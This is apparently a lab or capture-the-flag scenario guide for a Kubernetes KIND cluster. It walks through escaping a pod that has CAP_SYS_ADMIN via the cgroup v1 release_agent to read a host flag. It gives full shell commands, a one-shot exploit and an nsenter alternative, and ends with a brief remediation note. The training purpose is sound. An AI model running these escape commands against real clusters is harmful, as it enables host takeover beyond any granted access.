# K8S-14: CAP_SYS_ADMIN cgroup Escape

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-14 |
| 名称 | CAP_SYS_ADMIN cgroup Escape |
| 技术/CVE | CAP_SYS_ADMIN abuse |
| 难度 | L3 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：CAP_SYS_ADMIN abuse
- 难度：L3
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CAP_SYS_ADMIN abuse -- cgroup release_agent escape |
| Difficulty | L3 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-14-capsys |
| Flag Location | `/host-flag/flag.txt` on the KIND node (not mounted into the pod; host access required) |

## Attack Path Summary
1. Pod `capsys-pod` runs with `CAP_SYS_ADMIN` capability
2. The pod has cgroup v1 hierarchy mounted at `/sys/fs/cgroup` (hostPath)
3. CAP_SYS_ADMIN allows writing to `release_agent` in a cgroup
4. `release_agent` is executed on the host when the last process in the cgroup exits
5. Write a script that reads the flag and trigger cgroup release

## Prerequisites
- kubectl access to KIND cluster `cve-k8s-14-capsys`
- Pod name: `capsys-pod` (alpine image)
- Tools: `mount`, `mkdir`, `echo`
- Understanding of cgroup v1 release_agent mechanism

## Step-by-Step Exploitation

### Step 1: Initial Access
Exec into the pod with SYS_ADMIN capability:

```bash
kubectl exec -it capsys-pod -- sh
```

### Step 2: Verify SYS_ADMIN Capability
```bash
# Check capabilities
cat /proc/self/status | grep CapEff

# Verify we can mount filesystems
mount | grep cgroup
# Expected: cgroup mounts should be visible

# Check cgroup version
mount | grep cgroup
# If it shows cgroup type with "cgroup" (not cgroup2), we have cgroup v1
```

### Step 3: Check cgroup Mount Access
```bash
# List the cgroup mount
ls -la /sys/fs/cgroup/
# Expected: cgroup v1 controllers

# Find a cgroup that has the release_agent feature
# Typically you need to use a cgroup that you control (like memory)
ls /sys/fs/cgroup/memory/
# Expected: cgroup memory controller files
```

### Step 4: Set Up the Escape
The cgroup release_agent escape requires:

1. Creating a sub-cgroup
2. Writing a notify_on_release script
3. Setting release_agent to point to the script
4. Emptying the cgroup (so the last process exits, triggering release_agent)

```bash
# Create a writable cgroup
mkdir -p /sys/fs/cgroup/memory/exploit

# Enable notify_on_release for this cgroup
echo 1 > /sys/fs/cgroup/memory/exploit/notify_on_release

# Write the release agent script INSIDE the cgroup directory.
# The cgroup mount is a hostPath mount, so the host sees the same file
# at /sys/fs/cgroup/memory/exploit/payload.sh
cat > /sys/fs/cgroup/memory/exploit/payload.sh << 'SCRIPT'
#!/bin/sh
cat /host-flag/flag.txt > /tmp/flag_captured.txt
cp /tmp/flag_captured.txt /sys/fs/cgroup/memory/exploit/flag_captured.txt 2>/dev/null
chmod 644 /tmp/flag_captured.txt
SCRIPT
chmod +x /sys/fs/cgroup/memory/exploit/payload.sh
```

### Step 5: Set release_agent
```bash
# Set the release_agent to point to our script
# The path must be from the host's perspective
echo "/sys/fs/cgroup/memory/exploit/payload.sh" > /sys/fs/cgroup/memory/release_agent
# Expected: no output (if successful)

# Verify
cat /sys/fs/cgroup/memory/release_agent
# Expected: /sys/fs/cgroup/memory/exploit/payload.sh
```

### Step 6: Trigger the Release
To trigger the release_agent, the last process in the exploit cgroup must exit:

```bash
# Add the current shell to the exploit cgroup
echo $$ > /sys/fs/cgroup/memory/exploit/cgroup.procs

# Exit the shell to trigger release_agent
exit
# Now the exploit cgroup is empty -> release_agent runs on the host
```

### Step 7: Read the Flag
After exiting and re-entering the pod:

```bash
# Re-exec into the pod
kubectl exec -it capsys-pod -- sh

# The release_agent script wrote the flag on the host.
# With hostPID, read it through the host /proc view or the cgroup mount:
cat /sys/fs/cgroup/memory/exploit/flag_captured.txt 2>/dev/null
# OR
cat /proc/1/root/tmp/flag_captured.txt 2>/dev/null
# Expected: flag{k8s-14-*}
```

### Step 8: Alternative -- One-shot Exploit
```bash
# Complete exploit in one go
kubectl exec capsys-pod -- sh -c '
mkdir -p /sys/fs/cgroup/memory/exploit
echo 1 > /sys/fs/cgroup/memory/exploit/notify_on_release
echo "#!/bin/sh" > /sys/fs/cgroup/memory/exploit/payload.sh
echo "cat /host-flag/flag.txt > /sys/fs/cgroup/memory/exploit/flag_captured.txt" >> /sys/fs/cgroup/memory/exploit/payload.sh
chmod +x /sys/fs/cgroup/memory/exploit/payload.sh
echo "/sys/fs/cgroup/memory/exploit/payload.sh" > /sys/fs/cgroup/memory/release_agent
echo $$ > /sys/fs/cgroup/memory/exploit/cgroup.procs
'
# Then exit the pod to trigger
# Re-exec and read: cat /sys/fs/cgroup/memory/exploit/flag_captured.txt
```

### Step 9: Capture Flag
- Flag format: `flag{k8s-14-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node (host access required; not mounted into the pod)
- Expected output: `flag{k8s-14-default}` (or custom value from `CVE_FLAG`)

> 注：release_agent 逃逸依赖 cgroup v1。若节点为 cgroup v2，可改用
> `nsenter --target 1 --mount -- cat /host-flag/flag.txt`（本场景 pod 已启用
> hostPID + CAP_SYS_ADMIN）。

## Verification Commands
```bash
# Verify the scenario is deployed and running
kubectl get pod capsys-pod
# Expected: NAME         READY   STATUS    RESTARTS   AGE
#           capsys-pod   1/1     Running   0          ...

# Verify SYS_ADMIN capability
kubectl exec capsys-pod -- cat /proc/self/status | grep CapEff

# Verify cgroup mount
kubectl exec capsys-pod -- mount | grep cgroup

# Verify flag directory on the node
docker exec cve-k8s-14-capsys-control-plane ls /host-flag/
# Expected: flag.txt
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Linux capabilities, cgroups, and container runtime |
| 侦察与前置条件 | CAP_SYS_ADMIN presence and cgroup release_agent behavior |
| 核心漏洞与利用 | Abuse CAP_SYS_ADMIN to configure a cgroup escape |
| 权限、横向或影响 | Host command execution |
| 验证 | Collect the host flag from the escape result |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
